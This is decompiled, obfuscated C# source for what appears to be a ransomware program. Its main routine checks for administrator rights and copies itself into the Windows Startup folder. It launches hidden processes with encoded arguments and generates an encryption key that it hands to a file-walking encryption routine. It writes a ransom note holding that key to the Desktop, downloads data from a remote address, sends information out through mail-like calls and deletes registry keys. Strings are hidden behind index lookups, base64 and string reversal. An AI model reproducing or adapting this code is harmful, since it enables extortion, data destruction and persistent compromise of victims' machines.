	public static string fGJDSwwdvgHFNDo;

	public static string jNHTVHZBqZlXY;

	public static string BgFaLdyeGlB;

	public static string DgompREYCe;

	public static string GGjuftJCOHv;

	public static string EmovXGjNZgfAuW;

	public static string flDWlzyqRqaM;

	public static string YWRvYpdfqcy;

	public static string PRWcDTormIRYwd;

	public static string TwHrxYgsbbSNIL;

	public static string ekBBOoHwkxPOdO;

	public static string JMFuVgrABKcvSn;

	public static string qQMhwDGNyHmDk;

	public static string IfZSwTCiCwClBo;

	public static string EklUJCblWElDEp;

	public static string[] gKargFodTWtGS;

	public static string BfbuIxbfjKDpupL;

	public static bool BFsJeResSpJpbjH;

	public static string PKcodnoXFTDNrFzp;

	public static bool mcFzFNtJADHq;

	public static bool zVPjqhCrCSeYyi;

	public static bool MLHercclrEwK;

	public static bool loxxIMhUDXkV;

	public static string wYgKBMneFetPI;

	public static bool VZbRouVLPuojXZ;

	public static bool pywYSNkaxscgqyhR;

	public static bool tyzdftzBVGyaYiNXV;

	public static bool CUaMwlrEkxsAzb;

	public static bool rdRqmOAazIcaE;

	public static string xIWOyCueaqUo;

	public static bool HtXiXyicpuRZSGm;

	public static Stopwatch eDKncBVMTmx;

	public static int iMHVeSscbXPhxV;

	public static int qmtbLhoLXOw;

	public static bool QLNkNOgrJAesSS;

	public static string fCxIrHTFLNIsbC;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && RIVvDCRBcHrYt == getString_0(107396786))
		{
			try
			{
				FWUrFNZTtGVO CS_0024_003C_003E8__locals0 = new FWUrFNZTtGVO();
				CS_0024_003C_003E8__locals0.OpgpyVmbqvy = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.OpgpyVmbqvy) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && RIVvDCRBcHrYt == getString_0(107396786))
		{
			try
			{
				qSotBUwSvVGVY.cuoCVXdHOTK(pthiKiitPeDipqY);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (JMFuVgrABKcvSn == getString_0(107396781))
			{
				Thread thread = new Thread(cAIxRNqOCSjVjx.GqRKpTIQlxF);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (JwhvfsUfaFd == getString_0(107396781))
		{
			Thread.Sleep(int.Parse(xtSgYwxUPlY));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && cdDxujvfRDO == getString_0(107396781))
		{
			try
			{
				yOjACZEFmPC(MltDPGcncVSc(getString_0(107396808)));
			}
			catch
			{
			}
		}
		try
		{
			if (KbPWXaxyGiw == getString_0(107396781) && fAYufplyccGLl.ozLYiGAWqOmo())
			{
				new seyPBTDtLpInq().sTqtrQzqfQQZ(bool_0: false);
				fAYufplyccGLl.mqeExOhKjYg();
			}
		}
		catch (Exception)
		{
		}
		if (DQqsrNGhOoSM == getString_0(107396781) && fAYufplyccGLl.ozLYiGAWqOmo())
		{
			new seyPBTDtLpInq().sTqtrQzqfQQZ(bool_0: false);
			new seyPBTDtLpInq().gGtUMDRTyHUj();
		}
		if (jZGJiISxTeIH == getString_0(107396781))
		{
			WjbOSrhUjbPR.ySGEurrlwAkw();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397215);
			string text2 = text + Path.GetFileName(fileName);
			if (PctqfzqnuYN == getString_0(107396781) && fileName != text2)
			{
				Thread thread2 = new Thread(JUfZhNHDbjXgaCH);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (mzBGqUfZtpJZO == getString_0(107396781) && mainModule != null && fileName != text2)
			{
				try
				{
					LoAczHkdcIMTHN = jzEWgEdRLKbmE(0, WyzZZAaYjHUsongS.Count);
					File.Copy(fileName, text + WyzZZAaYjHUsongS[LoAczHkdcIMTHN], overwrite: true);
					Process.Start(text + WyzZZAaYjHUsongS[LoAczHkdcIMTHN]);
					gWCaCvnOhfPBas();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (NrawxhsOzAIQz == getString_0(107396781) && DateTime.Now < mgYOvqlfZDKvpJ)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (SubKXLTzqcDNZ == getString_0(107396781) && DateTime.Now > MnSlupSrQos)
			{
				gWCaCvnOhfPBas();
			}
		}
		catch
		{
		}
		snxHkRZpChp();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> source = taliprOMnTGcFw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						YoVGDQybWWFICjtj(getString_0(107391405), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> source2 = tNdkdYtjHRONCbo;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						YoVGDQybWWFICjtj(getString_0(107391428), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> source3 = vNfHqpeGUAcgE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107391383)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (EklUJCblWElDEp == getString_0(107396781))
				{
					string[] source4 = gKargFodTWtGS;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107391383)), getString_0(107391390) + string_0 + getString_0(107391349));
						};
					}
					Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!hwYAdwGTOvJd().Contains(getString_0(107391087)))
				{
					NNMJoJWcluCtznb(kjQmlqzYIQVD);
				}
				else
				{
					List<string> lnSJjOAshqQA = LnSJjOAshqQA;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							YoVGDQybWWFICjtj(MltDPGcncVSc(ViJjhZRbVgIOJj(getString_0(107391344))), string_0);
						};
					}
					Parallel.ForEach(lnSJjOAshqQA, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> mWOoiLgPzdCBQo = MWOoiLgPzdCBQo;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107390807)), string_0);
					};
				}
				Parallel.ForEach(mWOoiLgPzdCBQo, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> wbVfESprDIGIMr = WbVfESprDIGIMr;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						YoVGDQybWWFICjtj(getString_0(107390822), string_0);
					};
				}
				Parallel.ForEach(wbVfESprDIGIMr, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && MLHercclrEwK)
			{
				try
				{
					Thread thread4 = new Thread(YBSRicIqkep.PcNMvXIFOHISG);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			YoVGDQybWWFICjtj(getString_0(107397178), MltDPGcncVSc(getString_0(107397165)));
			YoVGDQybWWFICjtj(getString_0(107397178), MltDPGcncVSc(getString_0(107397124)));
			YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107397067)), MltDPGcncVSc(getString_0(107397054)));
			YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107397067)), MltDPGcncVSc(getString_0(107396412)));
		}
		SecureString secureString = new SecureString();
		if (tHrCgDAEpchMxMr == getString_0(107396786))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			rXvEUmxLKNoI = getString_0(107396238);
		}
		XKBARtNChmtca = wuGItxlauphjx.RfbDpcJdUFzPqTO(cxmYhbtdZHOT(secureString));
		if (tyzdftzBVGyaYiNXV)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), xIWOyCueaqUo)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), xIWOyCueaqUo), string.Concat(MltDPGcncVSc(getString_0(107396225)), new WebClient().DownloadString(MltDPGcncVSc(getString_0(107396712))), getString_0(107396671), MltDPGcncVSc(getString_0(107396634)), DateTime.Now, getString_0(107396671), MltDPGcncVSc(getString_0(107396593)), XKBARtNChmtca));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), xIWOyCueaqUo), getString_0(107396536) + XKBARtNChmtca);
				}
			}
			catch (Exception ex7)
			{
				if (VZbRouVLPuojXZ)
				{
					try
					{
						File.AppendAllText(wYgKBMneFetPI, getString_0(107396507) + ex7.Message + getString_0(107396671));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		xLiBnWdtQdkh.eqRvaeTPpFGeju(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), EmovXGjNZgfAuW), dWXjJswFfadXBJD(XKBARtNChmtca), null, null, getString_0(107396490), getString_0(107395929), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			rctHTEABuYQ();
		}
		try
		{
			IVbJXIjQTTnQcR(new string[26]
			{
				getString_0(107395944),
				getString_0(107395939),
				getString_0(107395934),
				getString_0(107395897),
				getString_0(107395892),
				getString_0(107395887),
				getString_0(107395914),
				getString_0(107395909),
				getString_0(107395904),
				getString_0(107395867),
				getString_0(107395862),
				getString_0(107395857),
				getString_0(107395852),
				getString_0(107395879),
				getString_0(107395874),
				getString_0(107395869),
				getString_0(107395832),
				getString_0(107395827),
				getString_0(107395822),
				getString_0(107395849),
				getString_0(107395844),
				getString_0(107395839),
				getString_0(107395802),
				getString_0(107395797),
				getString_0(107395792),
				getString_0(107395819)
			}, new string[100]
			{
				getString_0(107395814),
				getString_0(107395809),
				getString_0(107395804),
				getString_0(107395763),
				getString_0(107395758),
				getString_0(107395785),
				getString_0(107395780),
				getString_0(107395775),
				getString_0(107395738),
				getString_0(107395733),
				getString_0(107395728),
				getString_0(107395755),
				getString_0(107395746),
				getString_0(107395741),
				getString_0(107395700),
				getString_0(107395695),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107395712),
				getString_0(107396187),
				getString_0(107396178),
				getString_0(107396173),
				getString_0(107396200),
				getString_0(107396195),
				getString_0(107396190),
				getString_0(107396153),
				getString_0(107396148),
				getString_0(107396143),
				getString_0(107396170),
				getString_0(107396165),
				getString_0(107396160),
				getString_0(107396123),
				getString_0(107396118),
				getString_0(107396113),
				getString_0(107396136),
				getString_0(107396131),
				getString_0(107396126),
				getString_0(107396089),
				getString_0(107395780),
				getString_0(107396084),
				getString_0(107395738),
				getString_0(107396107),
				getString_0(107396102),
				getString_0(107396097),
				getString_0(107396092),
				getString_0(107396055),
				getString_0(107396050),
				getString_0(107396045),
				getString_0(107396072),
				getString_0(107396067),
				getString_0(107396062),
				getString_0(107396025),
				getString_0(107396020),
				getString_0(107396015),
				getString_0(107396042),
				getString_0(107396037),
				getString_0(107396032),
				getString_0(107395995),
				getString_0(107395986),
				getString_0(107395981),
				getString_0(107396004),
				getString_0(107395959),
				getString_0(107396084),
				getString_0(107395978),
				getString_0(107395969),
				getString_0(107395416),
				getString_0(107395407),
				getString_0(107395430),
				getString_0(107395421),
				getString_0(107395384),
				getString_0(107395375),
				getString_0(107395398),
				getString_0(107395389),
				getString_0(107395352),
				getString_0(107395347),
				getString_0(107395342),
				getString_0(107395369),
				getString_0(107395364),
				getString_0(107395359),
				getString_0(107395318),
				getString_0(107395313),
				getString_0(107395308),
				getString_0(107395335),
				getString_0(107395330),
				getString_0(107395325),
				getString_0(107395284),
				getString_0(107395307),
				getString_0(107395302),
				getString_0(107396118),
				getString_0(107395297),
				getString_0(107395292),
				getString_0(107395255),
				getString_0(107395250),
				getString_0(107395245),
				getString_0(107395268),
				getString_0(107395263),
				getString_0(107395226),
				getString_0(107395217),
				getString_0(107395212),
				getString_0(107395239)
			}, new string[0], cxmYhbtdZHOT(secureString), getString_0(107395234));
		}
		catch (Exception ex9)
		{
			if (VZbRouVLPuojXZ)
			{
				try
				{
					File.AppendAllText(wYgKBMneFetPI, getString_0(107395197) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684));
				streamWriter.WriteLine(MltDPGcncVSc(getString_0(107395651)));
				streamWriter.WriteLine(getString_0(107396671));
				streamWriter.WriteLine(MltDPGcncVSc(getString_0(107393785)));
				streamWriter.WriteLine(XKBARtNChmtca);
				if (bqciLIMtJOIROzlgHA == getString_0(107396786))
				{
					streamWriter.WriteLine(getString_0(107396671));
					streamWriter.WriteLine(MltDPGcncVSc(getString_0(107393752)) + Convert.ToString(CRTChqfNsauJEL.Count));
				}
				if (QLNkNOgrJAesSS)
				{
					streamWriter.WriteLine(getString_0(107396671));
					streamWriter.WriteLine(MltDPGcncVSc(getString_0(107393707)));
					streamWriter.WriteLine(IknfuhEjRGfqaq.CnslaQynQWw());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684));
				if (!text3.Contains(XKBARtNChmtca) && !mcFzFNtJADHq)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684), getString_0(107393674) + XKBARtNChmtca);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in juoIXWLeiNsyc)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395684)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684), item + getString_0(107395684), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684));
					if (!text4.Contains(XKBARtNChmtca) && !mcFzFNtJADHq)
					{
						File.AppendAllText(item + getString_0(107395684), getString_0(107393674) + XKBARtNChmtca);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!loxxIMhUDXkV && num > 10)
			{
				break;
			}
		}
		if (PRWcDTormIRYwd == getString_0(107396781))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394125)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394125));
					streamWriter2.WriteLine(MltDPGcncVSc(getString_0(107394092)));
					streamWriter2.WriteLine(getString_0(107396671));
					streamWriter2.WriteLine(MltDPGcncVSc(getString_0(107394075)));
					streamWriter2.WriteLine(XKBARtNChmtca + MltDPGcncVSc(getString_0(107394018)));
					if (bqciLIMtJOIROzlgHA == getString_0(107396786))
					{
						streamWriter2.WriteLine(getString_0(107396671));
						streamWriter2.WriteLine(MltDPGcncVSc(getString_0(107393973)) + MltDPGcncVSc(getString_0(107393752)) + Convert.ToString(CRTChqfNsauJEL.Count) + MltDPGcncVSc(getString_0(107394018)));
					}
					if (QLNkNOgrJAesSS)
					{
						streamWriter2.WriteLine(getString_0(107396671));
						streamWriter2.WriteLine(MltDPGcncVSc(getString_0(107393707)));
						streamWriter2.WriteLine(IknfuhEjRGfqaq.CnslaQynQWw());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684));
					if (!text5.Contains(XKBARtNChmtca) && !mcFzFNtJADHq)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394125), MltDPGcncVSc(getString_0(107393973)) + getString_0(107393674) + XKBARtNChmtca + MltDPGcncVSc(getString_0(107394018)));
					}
				}
			}
			catch
			{
			}
		}
		if (YWzKNQYtYMLj == getString_0(107396781))
		{
			try
			{
				if (bqciLIMtJOIROzlgHA == getString_0(107396786))
				{
					IknfuhEjRGfqaq.WUesPoonGtkX(getString_0(107393912), getString_0(107393907), getString_0(107393926), string.Concat(MltDPGcncVSc(getString_0(107396225)), new WebClient().DownloadString(MltDPGcncVSc(getString_0(107396712))), getString_0(107393917), MltDPGcncVSc(getString_0(107396634)), DateTime.Now, getString_0(107396671), MltDPGcncVSc(getString_0(107393368)), Convert.ToString(CRTChqfNsauJEL.Count), getString_0(107396671), MltDPGcncVSc(getString_0(107396593)), XKBARtNChmtca));
				}
				else
				{
					IknfuhEjRGfqaq.WUesPoonGtkX(getString_0(107393912), getString_0(107393907), getString_0(107393926), string.Concat(MltDPGcncVSc(getString_0(107396225)), new WebClient().DownloadString(MltDPGcncVSc(getString_0(107396712))), getString_0(107393917), MltDPGcncVSc(getString_0(107396634)), DateTime.Now, getString_0(107396671), MltDPGcncVSc(getString_0(107393368)), Convert.ToString(CRTChqfNsauJEL.Count), getString_0(107396671), MltDPGcncVSc(getString_0(107396593)), XKBARtNChmtca));
				}
			}
			catch
			{
			}
		}
		if (ofHnrODMqYEFdaB == getString_0(107396781))
		{
			try
			{
				grpaqaAWXFB.rVOhdukMTwfX(new Uri(getString_0(107393351)));
			}
			catch
			{
			}
		}
		if (PRWcDTormIRYwd == getString_0(107396786))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684)))
				{
					Process.Start(MltDPGcncVSc(getString_0(107393350)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395684));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394125)))
				{
					Process.Start(MltDPGcncVSc(getString_0(107393293)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394125));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(TilgfTEpILCaO))
		{
			try
			{
				File.Delete(TilgfTEpILCaO);
			}
			catch
			{
			}
		}
		if (VZbRouVLPuojXZ)
		{
			try
			{
				File.AppendAllText(wYgKBMneFetPI, getString_0(107393308));
			}
			catch (Exception)
			{
			}
		}
		if (PaqQKLIfcahgkkJ == getString_0(107393263))
		{
			gWCaCvnOhfPBas();
		}
	}

	public static void JUfZhNHDbjXgaCH()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(MltDPGcncVSc(getString_0(107393286)), MltDPGcncVSc(getString_0(107393612)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int jzEWgEdRLKbmE(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> tkbbPrTKhBwSIFb(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107393595)) && !text.Contains(getString_0(107393602)) && !text.Contains(getString_0(107393569)) && !text.ToLower().Contains(getString_0(107393520)) && !text.ToLower().Contains(getString_0(107393539)) && !text.Contains(getString_0(107393514)) && !text.Contains(getString_0(107393461)) && !text.ToLower().Contains(getString_0(107393476)) && !text.ToLower().Contains(getString_0(107393431)) && !text.ToLower().Contains(getString_0(107393394)) && !text.ToLower().Contains(getString_0(107393417)) && !text.ToLower().Contains(getString_0(107392856)) && !text.ToLower().Contains(getString_0(107392875)) && !text.ToLower().Contains(getString_0(107392862)) && !text.ToLower().Contains(getString_0(107392841)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107392784)) && !fileInfo.FullName.Contains(getString_0(107392799)) && !fileInfo.FullName.Contains(getString_0(107392750)) && !fileInfo.FullName.Contains(getString_0(107392765)) && !fileInfo.FullName.Contains(getString_0(107392716)) && !fileInfo.FullName.Contains(getString_0(107392699)) && !fileInfo.FullName.Contains(getString_0(107392714)) && !fileInfo.FullName.Contains(getString_0(107392665)) && !fileInfo.FullName.Contains(getString_0(107392652)) && !fileInfo.FullName.Contains(getString_0(107392631)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392650)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392637)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393100)) && !fileInfo.FullName.ToLower().Contains(getString_0(107393083)) && !fileInfo.FullName.Contains(MltDPGcncVSc(getString_0(107393098))) && !fileInfo.FullName.Contains(getString_0(107393041)) && !fileInfo.FullName.Contains(getString_0(107393060)) && !fileInfo.FullName.EndsWith(getString_0(107395234)) && !fileInfo.FullName.EndsWith(getString_0(107393035)) && !fileInfo.FullName.EndsWith(getString_0(107393030)) && !fileInfo.FullName.EndsWith(getString_0(107393025)) && !fileInfo.FullName.EndsWith(getString_0(107393020)) && !fileInfo.FullName.Contains(getString_0(107392983)) && !fileInfo.FullName.Contains(EmovXGjNZgfAuW) && !fileInfo.FullName.Contains(wYgKBMneFetPI) && !fileInfo.FullName.Contains(xIWOyCueaqUo))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(WszmglDXIZxoiW) * 1024.0 * 1024.0 && vnjAAOWySSxKeZlz == getString_0(107396781))
						{
							list.Add(fileInfo.FullName);
							volfkQPDDM(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && vnjAAOWySSxKeZlz == getString_0(107396786))
						{
							list.Add(fileInfo.FullName);
							volfkQPDDM(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string YoVGDQybWWFICjtj(string GBXqyjILrsFgYny = "", string xjpSymJPIm = "")
	{
		string result = getString_0(107393351);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = GBXqyjILrsFgYny,
				Arguments = xjpSymJPIm,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void yOjACZEFmPC(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392998),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string ViJjhZRbVgIOJj(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string MltDPGcncVSc(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void NNMJoJWcluCtznb(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = MltDPGcncVSc(getString_0(107392949));
		processStartInfo.Arguments = getString_0(107392920) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool gHuiPfDiOmnH(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string cxmYhbtdZHOT(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void snxHkRZpChp()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = ViJjhZRbVgIOJj(getString_0(107392915));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(MltDPGcncVSc(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392297)));
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392240)));
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392255)));
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392230)));
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392949)));
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392173)));
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392144)));
					registryKey.Close();
				}
				string_ = ViJjhZRbVgIOJj(getString_0(107392159));
				registryKey = Registry.LocalMachine.OpenSubKey(MltDPGcncVSc(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392574)));
					registryKey.Close();
				}
				string_ = ViJjhZRbVgIOJj(getString_0(107392525));
				registryKey = Registry.LocalMachine.OpenSubKey(MltDPGcncVSc(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392574)));
					registryKey.Close();
				}
				string_ = ViJjhZRbVgIOJj(getString_0(107392525));
				registryKey = Registry.CurrentUser.OpenSubKey(MltDPGcncVSc(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(MltDPGcncVSc(getString_0(107392574)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107392540)), MltDPGcncVSc(getString_0(107392523)));
			YoVGDQybWWFICjtj(MltDPGcncVSc(getString_0(107392442)), MltDPGcncVSc(getString_0(107392433)));
